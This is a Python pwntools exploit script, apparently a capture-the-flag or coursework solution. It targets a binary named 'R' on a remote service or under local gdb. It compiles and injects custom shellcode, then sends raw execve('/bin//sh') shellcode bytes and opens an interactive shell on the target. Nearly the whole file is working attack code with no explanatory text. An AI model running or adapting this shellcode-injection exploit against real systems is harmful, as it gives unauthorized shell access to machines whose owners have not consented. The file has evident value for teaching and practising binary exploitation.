#!/usr/bin/python3

from pwn import *
import sys
import subprocess

elf_name = './R'
libc_name = './libc-2.29.so'
e = ELF(elf_name)
libc = ELF(libc_name)

context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'

if len(sys.argv) > 1:
    r = remote('140.112.31.97', 30202)
else:
    r = gdb.debug(elf_name, env={"LD_PRELOAD": libc_name}, gdbscript='''
    b *0x5555555553f1
    b *0x5555555555d1
    b *0x5555555558f2
    b *0x555555555957
    c
    ni
    p $rax
    c

    c
    ni
    ''')

#p = subprocess.Popen(['./extract.sh', 'shellcode.o'], stdout=subprocess.PIPE)
#sc = p.stdout.read()[:-1].decode().split('\\x')
#sc = b''.join(list(map(bytes.fromhex, sc)))

subprocess.Popen(['make'])
sleep(0.2)
subprocess.Popen(['objcopy', '-j.text', '-O', 'binary', 'shellcode.o', 'shellcode.bin'])
sleep(0.2)
sc = open('shellcode.bin', 'rb').read()
print(sc)
print(hex(len(sc)))

if len(sys.argv) == 1:
    pid = r.recvline()[:-1].split(b' ')[-1].decode()
    child = gdb.attach(int(pid), gdbscript='''
        b *0x555555555a2e
        c
        ''')

sleep(0.2)
r.sendlineafter('Give me code : ', sc)
binsh_sc = asm('''
xor rsi, rsi
xor rdx, rdx
movabs rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov rax, 0x3b
syscall
''')
binsh_sc = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
r.sendafter('Only quitters giveup', binsh_sc)
r.interactive()
